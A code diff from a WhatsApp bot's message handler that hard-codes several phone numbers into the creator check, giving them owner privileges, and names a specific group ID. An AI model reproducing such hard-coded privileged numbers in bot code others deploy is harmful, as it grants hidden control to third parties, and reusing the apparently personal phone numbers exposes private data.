@@ -185,10 +185,10 @@ module.exports = ElisaBotMd = async (ElisaBotMd, m, chatUpdate, store) => {
         const botNumber = await ElisaBotMd.decodeJid(ElisaBotMd.user.id)
     	const thivanumber = "94716221644"
     	const thivanumber2 = "94716221644"
+    	const pasiduu = "94716338723"
     	const isuruu = "94716221644"
-    	const isuruu = "94716221644"
-    	const isuruu = "94716221644"
-        const isCreator = [isuruu,isuruu,isuruu,thivanumber2,botNumber,thivanumber ,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+    	const thinuraa = "94711421243"
+        const isCreator = [pasiduu,isuruu,thinuraa,thivanumber2,botNumber,thivanumber ,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const isNima = m.sender == "94716221644@s.whatsapp.net" ? true : false
         const itsMe = m.sender == botNumber ? true : false
         const isXnxxGrp = m.chat == "120363043146209271@g.us" ? true : false 
